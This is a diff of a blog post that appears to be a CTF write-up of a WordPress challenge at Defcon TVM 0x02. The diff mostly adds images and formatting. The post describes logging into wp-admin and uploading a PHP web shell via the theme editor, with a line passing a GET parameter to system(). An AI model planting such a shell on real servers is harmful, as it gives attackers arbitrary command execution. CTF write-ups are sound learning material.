@@ -8,9 +8,13 @@ permalink: /:title/
 category: Boot2Root
 ---
 
+![](/img/redteam/redteamlogo.png)
+
+
 This is a write-up for the WEB-APP Challenge [Capture South Africa] in Redteamvillage’s CTF event at Defcon TVM 0x02.
 
 
+![](/img/redteam/redteambanner.jpg)
 
 
 Special thanks to my awesome team members of defcon_speakers_0x02 (Sreeram KL & Vishnuprasad PG)
@@ -25,7 +29,7 @@ http://l.xyz was a web application which was running wordpress instance, while d
  <p> 
 then, i went to /wp-admin/ and logged into the admin account, we all thought that the flag would be inside the admin panel, but it was not there! where was it? suddenly i got an idea to shell the server, i went to themes, and added a .php file with the following code. </p>
 
-<code>
+```
 <?
 <HTML>
 <BODY>
@@ -40,10 +44,14 @@ system($_GET[‘cmd’]);
 ?>
 </BODY></HTML>
 </code>
-  
+```
+
+
 <p>
 and used ls, and some basic commands, and the flag was inside the /www2/ directory in a file called flag.txt
-This was a webapp challenge in the redteamvillage’s ctf, and i loved pr3wning it! There were 6 challenges in total, and our team managed to solve 5 of them, and won the 2nd place :)
+This was a webapp challenge in the redteamvillage’s ctf, and i loved pr3wning it! There were 6 challenges in total, and our team managed to solve 5 of them, and won the 2nd place :) </p>
+
+<p>
 Thanks for reading, I hope it was a good read!
 P.S: I’ve wanted to make a writeup for the other challenges too, but i don’t have much time with me in order to do that :(
 Bug Bounty Hunting
